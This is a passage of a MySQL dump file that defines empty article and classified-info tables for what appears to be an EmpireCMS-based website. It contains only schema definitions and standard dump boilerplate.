-- MySQL dump 10.13  Distrib 5.1.73, for redhat-linux-gnu (x86_64)
--
-- Host: 2398.dnstoo.com    Database: nclbdp
-- ------------------------------------------------------
-- Server version	5.5.35-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `libang_ecms_article`
--

DROP TABLE IF EXISTS `libang_ecms_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` char(20) NOT NULL DEFAULT '',
  `filename` char(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` char(14) NOT NULL DEFAULT '',
  `titleurl` char(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` char(80) NOT NULL DEFAULT '',
  `title` char(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` char(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `ftitle` char(120) NOT NULL DEFAULT '',
  `smalltext` char(255) NOT NULL DEFAULT '',
  `writer` char(30) NOT NULL DEFAULT '',
  `befrom` char(60) NOT NULL DEFAULT '',
  `newstext` char(50) NOT NULL DEFAULT '',
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article`
--

LOCK TABLES `libang_ecms_article` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_check`
--

DROP TABLE IF EXISTS `libang_ecms_article_check`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_check` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` char(20) NOT NULL DEFAULT '',
  `filename` char(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` char(14) NOT NULL DEFAULT '',
  `titleurl` char(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` char(80) NOT NULL DEFAULT '',
  `title` char(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` char(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `ftitle` char(120) NOT NULL DEFAULT '',
  `smalltext` char(255) NOT NULL DEFAULT '',
  `writer` char(30) NOT NULL DEFAULT '',
  `befrom` char(60) NOT NULL DEFAULT '',
  `newstext` char(50) NOT NULL DEFAULT '',
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_check`
--

LOCK TABLES `libang_ecms_article_check` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_check` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_check` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_check_data`
--

DROP TABLE IF EXISTS `libang_ecms_article_check_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_check_data` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` char(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` char(80) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_check_data`
--

LOCK TABLES `libang_ecms_article_check_data` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_check_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_check_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_data_1`
--

DROP TABLE IF EXISTS `libang_ecms_article_data_1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_data_1` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` char(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` char(80) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_data_1`
--

LOCK TABLES `libang_ecms_article_data_1` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_data_1` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_data_1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_doc`
--

DROP TABLE IF EXISTS `libang_ecms_article_doc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_doc` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` char(20) NOT NULL DEFAULT '',
  `filename` char(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` char(14) NOT NULL DEFAULT '',
  `titleurl` char(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` char(80) NOT NULL DEFAULT '',
  `title` char(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` char(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `ftitle` char(120) NOT NULL DEFAULT '',
  `smalltext` char(255) NOT NULL DEFAULT '',
  `writer` char(30) NOT NULL DEFAULT '',
  `befrom` char(60) NOT NULL DEFAULT '',
  `newstext` char(50) NOT NULL DEFAULT '',
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_doc`
--

LOCK TABLES `libang_ecms_article_doc` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_doc` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_doc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_doc_data`
--

DROP TABLE IF EXISTS `libang_ecms_article_doc_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_doc_data` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` char(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` char(80) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_doc_data`
--

LOCK TABLES `libang_ecms_article_doc_data` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_doc_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_doc_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_doc_index`
--

DROP TABLE IF EXISTS `libang_ecms_article_doc_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_doc_index` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`),
  KEY `newstime` (`newstime`),
  KEY `truetime` (`truetime`,`id`),
  KEY `havehtml` (`classid`,`truetime`,`havehtml`,`checked`,`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_doc_index`
--

LOCK TABLES `libang_ecms_article_doc_index` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_doc_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_doc_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_article_index`
--

DROP TABLE IF EXISTS `libang_ecms_article_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_article_index` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`),
  KEY `newstime` (`newstime`),
  KEY `truetime` (`truetime`,`id`),
  KEY `havehtml` (`classid`,`truetime`,`havehtml`,`checked`,`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_article_index`
--

LOCK TABLES `libang_ecms_article_index` WRITE;
/*!40000 ALTER TABLE `libang_ecms_article_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_article_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info`
--

DROP TABLE IF EXISTS `libang_ecms_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` varchar(20) NOT NULL DEFAULT '',
  `filename` varchar(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` varchar(14) NOT NULL DEFAULT '',
  `titleurl` varchar(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` varchar(80) NOT NULL DEFAULT '',
  `title` varchar(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` varchar(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `smalltext` text NOT NULL,
  `myarea` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info`
--

LOCK TABLES `libang_ecms_info` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_check`
--

DROP TABLE IF EXISTS `libang_ecms_info_check`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_check` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` varchar(20) NOT NULL DEFAULT '',
  `filename` varchar(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` varchar(14) NOT NULL DEFAULT '',
  `titleurl` varchar(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` varchar(80) NOT NULL DEFAULT '',
  `title` varchar(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` varchar(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `smalltext` text NOT NULL,
  `myarea` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_check`
--

LOCK TABLES `libang_ecms_info_check` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_check` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_check` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_check_data`
--

DROP TABLE IF EXISTS `libang_ecms_info_check_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_check_data` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` varchar(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` varchar(80) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `mycontact` varchar(255) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_check_data`
--

LOCK TABLES `libang_ecms_info_check_data` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_check_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_check_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_data_1`
--

DROP TABLE IF EXISTS `libang_ecms_info_data_1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_data_1` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` varchar(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` varchar(80) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `mycontact` varchar(255) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_data_1`
--

LOCK TABLES `libang_ecms_info_data_1` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_data_1` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_data_1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_doc`
--

DROP TABLE IF EXISTS `libang_ecms_info_doc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_doc` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` varchar(20) NOT NULL DEFAULT '',
  `filename` varchar(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` varchar(14) NOT NULL DEFAULT '',
  `titleurl` varchar(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` varchar(80) NOT NULL DEFAULT '',
  `title` varchar(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` varchar(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `smalltext` text NOT NULL,
  `myarea` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_doc`
--

LOCK TABLES `libang_ecms_info_doc` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_doc` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_doc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_doc_data`
--

DROP TABLE IF EXISTS `libang_ecms_info_doc_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_doc_data` (
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keyid` varchar(255) NOT NULL DEFAULT '',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `newstempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `haveaddfen` tinyint(1) NOT NULL DEFAULT '0',
  `infotags` varchar(80) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `mycontact` varchar(255) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_doc_data`
--

LOCK TABLES `libang_ecms_info_doc_data` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_doc_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_doc_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_doc_index`
--

DROP TABLE IF EXISTS `libang_ecms_info_doc_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_doc_index` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
